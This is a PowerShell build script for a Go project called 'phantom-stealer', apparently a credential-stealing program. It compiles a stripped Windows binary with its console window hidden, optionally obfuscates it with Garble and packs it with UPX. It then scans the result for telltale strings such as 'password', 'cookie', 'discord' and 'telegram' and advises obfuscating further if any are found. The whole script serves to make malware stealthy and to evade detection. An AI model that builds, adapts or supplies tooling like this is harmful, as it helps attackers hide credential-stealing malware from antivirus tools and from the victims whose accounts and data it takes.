# phantom-stealer build script
# builds optimized, stripped, obfuscated binary

param(
    [string]$Output = "phantom.exe",
    [switch]$Debug,
    [switch]$UPX,
    [switch]$Garble
)

$ErrorActionPreference = "Stop"

Write-Host "[*] Phantom Stealer Build Script" -ForegroundColor Cyan
Write-Host ""

# clean previous builds
if (Test-Path $Output) {
    Remove-Item $Output -Force
}

# set environment for CGO (required for sqlite3)
$env:CGO_ENABLED = "1"
$env:CC = "gcc"

# build flags
$ldflags = @(
    "-s",           # strip symbol table
    "-w",           # strip DWARF debug info
    "-H=windowsgui" # hide console window
)

$gcflags = ""
$buildflags = @()

if ($Debug) {
    Write-Host "[*] Building DEBUG version..." -ForegroundColor Yellow
    $ldflags = @("-H=windowsgui")
}
else {
    Write-Host "[*] Building RELEASE version..." -ForegroundColor Green
    $buildflags += "-trimpath"    # remove file paths from binary
    $gcflags = "-l"               # disable inlining for smaller binary
}

$ldflagStr = $ldflags -join " "

Write-Host "[*] Downloading dependencies..." -ForegroundColor Cyan
go mod tidy
if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Failed to download dependencies" -ForegroundColor Red
    exit 1
}

# check for garble obfuscator
if ($Garble) {
    $garblePath = Get-Command garble -ErrorAction SilentlyContinue
    if ($garblePath) {
        Write-Host "[*] Building with Garble obfuscation..." -ForegroundColor Magenta
        
        $buildCmd = "garble -literals -tiny -seed=random build"
        if ($buildflags.Count -gt 0) {
            $buildCmd += " " + ($buildflags -join " ")
        }
        $buildCmd += " -ldflags=`"$ldflagStr`" -o `"$Output`" ."
        
        Invoke-Expression $buildCmd
    }
    else {
        Write-Host "[!] Garble not found, using standard build" -ForegroundColor Yellow
        Write-Host "[!] Install with: go install mvdan.cc/garble@latest" -ForegroundColor Yellow
        $Garble = $false
    }
}

if (-not $Garble) {
    Write-Host "[*] Building binary..." -ForegroundColor Cyan
    
    $buildArgs = @("build")
    if ($buildflags.Count -gt 0) {
        $buildArgs += $buildflags
    }
    if ($gcflags) {
        $buildArgs += "-gcflags=$gcflags"
    }
    $buildArgs += "-ldflags=$ldflagStr"
    $buildArgs += "-o"
    $buildArgs += $Output
    $buildArgs += "."
    
    & go @buildArgs
}

if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Build failed" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $Output)) {
    Write-Host "[-] Output file not created" -ForegroundColor Red
    exit 1
}

$size = (Get-Item $Output).Length / 1KB
Write-Host "[+] Build successful: $Output ($([math]::Round($size, 2)) KB)" -ForegroundColor Green

# optional UPX compression
if ($UPX) {
    $upxPath = Get-Command upx -ErrorAction SilentlyContinue
    if ($upxPath) {
        Write-Host "[*] Compressing with UPX..." -ForegroundColor Cyan
        upx --best --lzma $Output 2>$null
        
        $newSize = (Get-Item $Output).Length / 1KB
        Write-Host "[+] Compressed: $([math]::Round($newSize, 2)) KB" -ForegroundColor Green
    }
    else {
        Write-Host "[!] UPX not found, skipping compression" -ForegroundColor Yellow
    }
}

# signature info
Write-Host ""
Write-Host "[*] Binary Analysis:" -ForegroundColor Cyan
Write-Host "    File: $Output"
Write-Host "    Size: $([math]::Round((Get-Item $Output).Length / 1KB, 2)) KB"
Write-Host "    Hash: $((Get-FileHash $Output -Algorithm SHA256).Hash.Substring(0,16))..."

# check strings for obvious indicators
$strings = & strings $Output 2>$null | Select-Object -First 100
$badStrings = @("phantom", "stealer", "password", "cookie", "discord", "telegram")
$found = @()
foreach ($bad in $badStrings) {
    if ($strings -match $bad) {
        $found += $bad
    }
}

if ($found.Count -gt 0) {
    Write-Host ""
    Write-Host "[!] Warning: Found suspicious strings in binary:" -ForegroundColor Yellow
    Write-Host "    $($found -join ', ')" -ForegroundColor Yellow
    Write-Host "[!] Consider using Garble for obfuscation" -ForegroundColor Yellow
}
else {
    Write-Host "[+] No obvious suspicious strings detected" -ForegroundColor Green
}

Write-Host ""
Write-Host "[*] Build complete!" -ForegroundColor Green
